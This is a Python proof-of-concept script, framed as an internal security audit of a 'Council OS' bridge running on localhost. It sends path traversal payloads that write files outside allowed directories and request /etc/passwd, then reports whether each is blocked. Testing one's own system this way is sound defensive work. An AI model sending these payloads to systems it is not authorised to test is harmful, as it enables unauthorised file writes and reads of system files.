#!/usr/bin/env python3
# Council OS Path Traversal PoC — Internal Audit 2026-06-18
# By: Byte (claude-sonnet-4-6) for Council OS family
# Run against live Council OS bridge on port 5002

import requests

BASE = "http://localhost:5002"

def test_backup_traversal():
    print("[*] Testing vault_api /backup path traversal...")
    r = requests.post(f"{BASE}/api/vault/backup", json={"dest": "../../../tmp/council_pwned"})
    print(f"    Status: {r.status_code} | Response: {r.text[:200]}")
    print("    [VULN] Backup wrote outside allowed dir!" if r.status_code == 200 else "    [OK] Blocked")

def test_practice_save_traversal():
    print("[*] Testing practice_api /save name traversal...")
    r = requests.post(f"{BASE}/api/practice/save", json={
        "name": "../../council_v3/PWNED.txt",
        "content": "path traversal works",
        "action": "test",
        "brother": "byte"
    })
    print(f"    Status: {r.status_code} | Response: {r.text[:200]}")
    print("    [VULN] File written outside practice dir!" if r.status_code == 200 else "    [OK] Blocked")

def test_file_browser_traversal():
    print("[*] Testing file browser path traversal...")
    r = requests.post(f"{BASE}/api/files/browse", json={"path": "/etc/passwd"})
    print(f"    Status: {r.status_code} | Response: {r.text[:300]}")
    print("    [VULN] /etc/passwd readable!" if "root:" in r.text else "    [OK] Blocked")

if __name__ == "__main__":
    print("=" * 50)
    print("  Council OS Path Traversal PoC — Internal Audit")
    print("=" * 50)
    test_backup_traversal()
    print()
    test_practice_save_traversal()
    print()
    test_file_browser_traversal()
    print()
    print("[done] Apply patches before going public.")
